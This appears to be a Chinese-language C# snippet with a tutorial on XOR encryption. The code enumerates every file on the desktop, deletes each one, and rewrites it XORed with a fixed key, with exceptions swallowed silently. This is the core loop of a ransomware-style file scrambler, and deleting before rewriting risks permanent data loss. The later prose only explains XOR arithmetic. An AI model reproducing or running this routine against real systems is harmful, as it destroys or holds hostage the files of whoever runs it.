```csharp
// 遍历桌面上的所有文件
foreach (string file in Directory.EnumerateFiles(desktop))
{
    try
    {
        // 读取文件内容到字节数组中
        byte[] buffer = File.ReadAllBytes(file);

        // 如果文件大小超过2GB，则不进行加密处理
        if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
        {
            continue;
        }

        // 删除原始文件
        File.Delete(file);

        // 遍历字节数组中的每个字节，对其进行加密操作
        for (int i = 0; i < buffer.Length; i++)
        {
            buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
        }

        // 将加密后的字节数组写回到原始文件中
        File.WriteAllBytes(file, buffer);
    }
    catch (Exception ex)
    {
        // 处理异常
    }
}

```

在 C# 中，异或运算符用符号“^”表示，表示两个二进制数每一位进行比较，若相同则该位为 0，若不同则该位为 1。例如，2 ^ 3 的结果为 1，其二进制表示分别为 10 和 11，因为只有第二位不同，所以结果为 01，即 1。在加密算法中，异或运算常用于对原始数据和密钥进行加密。

假设我们有一个二进制数 0101 和一个密钥 1010，我们可以将它们进行异或运算，得到加密后的结果。具体操作如下：
```yaml
0101
XOR 1010
= 1111
```
在这个例子中，每一位上的数字都与密钥上的对应位进行异或运算。第一位的 0 与密钥的 1 进行异或，得到 1；第二位的 1 与密钥的 0 进行异或，得到 1；第三位的 0 与密钥的 1 进行异或，得到 1；第四位的 1 与密钥的 0 进行异或，得到 1。最终结果为 1111，即加密后的数据。

解密的过程同样是对密文和密钥进行异或运算，得到原始数据。例如，我们可以将加密后的数据 1111 和密钥 1010 进行异或运算，得到原始数据：
```yaml
1111
XOR 1010
= 0101
```
因为异或运算具有反运算的特性，所以将加密后的结果再与密钥进行一次异或运算，即可得到原始数据。